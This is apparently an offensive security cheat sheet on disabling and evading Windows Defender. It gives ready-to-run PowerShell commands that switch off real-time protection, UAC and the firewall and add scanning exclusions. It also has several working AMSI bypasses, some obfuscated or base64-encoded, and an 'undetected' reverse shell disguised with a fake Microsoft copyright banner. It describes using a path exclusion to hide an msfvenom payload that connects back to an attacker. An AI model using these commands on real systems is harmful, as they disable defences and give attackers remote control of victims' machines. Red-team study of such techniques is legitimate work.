# Disable and Bypass Defender

## Check if Defender is enabled

```powershell
# Check if Defender is enabled
Get-MpComputerStatus
Get-MpComputerStatus | Select AntivirusEnabled

# Check if defensive modules are enabled
Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL

# Check if tamper protection is enabled
Get-MpComputerStatus | Select IsTamperProtected,RealTimeProtectionEnabled | FL
```

### Alternative Antivirus products

In some cases if it appears Defender is not enabled an alternative Antivirus solution may be in effect.

```bash
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

![](<../../../.gitbook/assets/image (2039) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Decoding the value of ProductState to hex can help identify which Antivirus is enabled

```powershell
'0x{0:x}' -f <ProductState>
'0x{0:x}' -f 393472
```

From the values below anything that has a **10** starting from the fourth numerical position indicates **On** and anything else indicates **Off**. As below we can see BitDefender is enabled and Windows Defender is disabled.

![](<../../../.gitbook/assets/image (2032) (1).png>)

## Turning off features

**Note:** Disabling `UAC` is advisable before attempting to turn features off. In testing some changes prompted for user confirmation before allowing change.

```bash
cmd.exe /c "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
```

**Note:** If Tamper protection is enabled you will not be able to turn off Defender by CMD or PowerShell. You can however, still create an exclusion.

```bash
# Disables realtime monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disables scanning for downloaded files or attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behaviour monitoring
Set-MPPreference -DisableBehaviourMonitoring $true

# Make exclusion for a certain folder
Add-MpPreference -ExclusionPath "C:\Windows\Temp"

# Disables cloud detection
Set-MPPreference -DisableBlockAtFirstSeen $true

# Disables scanning of .pst and other email formats
Set-MPPreference -DisableEmailScanning $true

# Disables script scanning during malware scans
Set-MPPReference -DisableScriptScanning $true

# Exclude files by extension
Set-MpPreference -ExclusionExtension "ps1"

# Turn off everything and set exclusion to "C:\Windows\Temp"
Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

### Bypassing with Path Exclusions

With reference to above we see its possible to use `PowerShell` to exclude Windows Defender from taking action on certain paths, using path exclusions.

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\Temp"
```

Running `curl` on a `msfvenom` payload where the output folder is outside of the defined exclusion path:

![](<../../../.gitbook/assets/image (2034) (1) (1) (1).png>)

Running the same command again however, this time specifying the excluded path from Defender `C:\temp` we see Defender has not picked up the malware.

![](<../../../.gitbook/assets/image (2038) (1) (1) (1) (1) (1) (1) (1).png>)

Over on the attackers machine we see the `msfvenom` payload has connected back. Under normal circumstances AV will have no issues discovering this msfvenom payload.

![](<../../../.gitbook/assets/image (2036) (1) (1) (1) (1).png>)

### Firewall

Disable all Firewall profiles (Requires Admin privileges).

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

## AMSI Bypass

### **Tools**

**Amsi.Fail:** [https://amsi.fail/](https://amsi.fail/)

**AMSITrigger:** [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)

### **PowerShell snippets**

{% tabs %}
{% tab title="Bypass 2023" %}
{% code overflow="wrap" %}
```powershell
$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)
```
{% endcode %}
{% endtab %}

{% tab title="Bypass 12/2021" %}
[https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI\_bypass\_2021\_12.ps1](https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI\_bypass\_2021\_12.ps1)

```powershell
$A="5492868772801748688168747280728187173688878280688776"
$B="8281173680867656877679866880867644817687416876797271"
function C($n, $m){
[string]($n..$m|%{[char][int](29+($A+$B).
    substring(($_*2),2))})-replace " "}
$k=C 0 37; $r=C 38 51
$a=[Ref].Assembly.GetType($k)
$a.GetField($r,'NonPublic,Static').SetValue($null,$true)
```
{% endtab %}

{% tab title="Bypass 09/2021" %}
[https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI\_bypass\_2021\_09.ps1](https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI\_bypass\_2021\_09.ps1)

```powershell
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)
```
{% endtab %}

{% tab title="Obfuscated" %}
```powershell
#1
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]("{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f 'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )

#2
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

#3
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
{% endtab %}

{% tab title="Base64" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```
{% endtab %}
{% endtabs %}

## Undetected Reverse Shells

```powershell
$c = New-Object System.Net.Sockets.TCPClient(<IP>,<Port>);
$I = $c.GetStream();
[byte[]]$U = 0..(2-shl15)|%{0};
$U = ([text.encoding]::ASCII).GetBytes("Copyright (C) 2021 Microsoft Corporation. All rights reserved.`n`n")
$I.Write($U,0,$U.Length)
$U = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$I.Write($U,0,$U.Length)
while(($k = $I.Read($U, 0, $U.Length)) -ne 0){;$D = (New-Object System.Text.UTF8Encoding).GetString($U,0, $k);
$a = (iex $D 2>&1 | Out-String );
$r  = $a + (pwd).Path + '> ';
$m = ([text.encoding]::ASCII).GetBytes($r);
$I.Write($m,0,$m.Length);
$I.Flush()};
$c.Close()
```

## Further AMSI Reading

**URL:** [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

**URL:** [https://amsi.fail/](https://amsi.fail/)

## Resources

**Tamper Protection:** [https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection?view=o365-worldwide)
